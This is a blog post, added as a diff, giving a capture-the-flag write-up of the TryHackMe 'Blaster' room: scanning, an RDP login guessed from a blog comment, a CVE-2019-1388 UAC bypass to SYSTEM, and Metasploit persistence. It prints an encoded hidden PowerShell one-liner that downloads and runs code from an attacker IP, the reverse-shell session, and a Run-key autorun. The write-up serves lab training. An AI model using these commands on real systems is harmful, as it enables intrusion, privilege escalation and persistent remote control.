@@ -1,0 +1,121 @@
+---
+layout: post
+title:  "Blaster (THM)"
+date:   2025-08-02 18:40:43 -0400
+author: robo.uzi
+tags: [TryHackMe, ctf]
+---
+
+## Initial Compromise
+
+I run `sudo nmap -Pn -p- -vv -T4 10.10.223.175 -oN blasterfullnmap.txt` to start:
+```shell
+PORT     STATE SERVICE       REASON  
+80/tcp   open  http          syn-ack ttl 125  
+3389/tcp open  ms-wbt-server syn-ack ttl 125
+```
+
+`nmap -sVC -p 80,3389 -vv -T4 10.10.223.175 -oN blasternmap.txt`:
+```shell
+PORT     STATE SERVICE       REASON  VERSION  
+80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0  
+|_http-title: IIS Windows Server  
+|_http-server-header: Microsoft-IIS/10.0  
+| http-methods:    
+|   Supported Methods: OPTIONS TRACE GET HEAD POST  
+|_  Potentially risky methods: TRACE  
+3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services  
+|_ssl-date: 2025-04-12T22:46:43+00:00; -1s from scanner time.  
+| ssl-cert: Subject: commonName=RetroWeb  
+| Issuer: commonName=RetroWeb  
+| Public Key type: rsa  
+| Public Key bits: 2048  
+| Signature Algorithm: sha256WithRSAEncryption  
+```
+
+2 ports are open. One is running a `IIS Windows Server`. The other is `RDP`. 
+
+I run `gobuster dir -u http://10.10.223.175/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 40`.
+
+I navigate to `http://10.10.223.175/retro/` and find a retro game blog by someone named `Wade`.
+
+On a comment on the blog post `http://10.10.223.175/retro/index.php/2019/12/09/ready-player-one/` I find `Leaving myself a note here just in case I forget how to spell it: parzival`.
+
+From this I can guess the rdp creds. I find `user.txt` on the desktop.
+
+___
+
+## Priv Esc
+
+The previous user was researching `CVE-2019-1388` and left behind an executable named `hhupd`.
+
+This CVE abuses the UAC windows Certificate Dialog to execute the certificate issuer link as an NT Authority User and open a browser that is under NT Authority User. Then we can use that to prompt a shell as a NT Authority User.
+
+Steps:
+```
+1) find a program that can trigger the UAC prompt screen
+
+2) select "Show more details"
+
+3) select "Show information about the publisher's certificate"
+
+4) click on the "Issued by" URL link it will prompt a browser interface.
+
+5) wait for the site to be fully loaded & select "save as" to prompt a explorer window for "save as".
+
+6) on the explorer window address path, enter the cmd.exe full path:
+C:\WINDOWS\system32\cmd.exe
+
+7) now you'll have an escalated privileges command prompt. 
+```
+
+I do this by opening `hhupd` and I gain access to `cmd.exe` with elevated privileges.
+
+I find `root.txt` at `C:\Users\Administrator\Desktop`.
+
+___
+
+## Persistence
+
+I launch `msfconsole` then run `use exploit/multi/script/web_delivery`.
+
+I run `set target 2` to set it from python to psh or powershell.
+
+I run `set payload windows/meterpreter/reverse_http`, `set LPORT 5555`, and `set LHOST 10.13.66.123`.
+
+I run the attack as a job with `run -j`.
+
+It outputs this command: 
+```shell
+powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABiAHQAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAYgB0AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAYgB0AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAzAC4ANgA2AC4AMQAyADMAOgA4ADAAOAAwAC8AbwBFAEMAZABxAEkALwBDADkAeQBtADgANABQAGoAeQBLACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADMALgA2ADYALgAxADIAMwA6ADgAMAA4ADAALwBvAEUAQwBkAHEASQAnACkAKQA7AA==
+```
+
+I paste this into the elevated cmd.exe and gain a meterpreter shell:
+```shell 
+[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) >> sessions  
+  
+Active sessions  
+===============  
+  
+ Id  Name  Type                     Information                     Connection  
+ --  ----  ----                     -----------                     ----------  
+ 1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ RETROWEB 10.13.66.123:5555 -> 10.10.223.175:49887 (10.10.223.175)  
+  
+[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) >> sessions -i 1  
+[*] Starting interaction with 1...  
+  
+(Meterpreter 1)(C:\Users\Administrator\Desktop) >
+```
+
+I run `use exploit/windows/local/persistence`, then `set SESSION 1`, `set STARTUP SYSTEM`, `set LHOST 10.13.66.123`, and `set LPORT 6666`:
+```shell
+[msf](Jobs:1 Agents:1) exploit(windows/local/persistence) >> run  
+[*] Running persistent module against RETROWEB via session ID: 2  
+[+] Persistent VBS script written on RETROWEB to C:\Windows\TEMP\bNNPwlE.vbs  
+[*] Installing as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\TiOvZUmFIYAiP  
+[+] Installed autorun on RETROWEB as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\TiOvZUmFIYAiP  
+[*] Clean up Meterpreter RC file: /home/user/.msf4/logs/persistence/RETROWEB_20250412.5648/RETROWEB_20250412.5648.rc
+```
+Now the computer should connect back to me any time it is turned on. However Windows defender is enabled here and I did not disable it, so it got deleted :(
+
+___
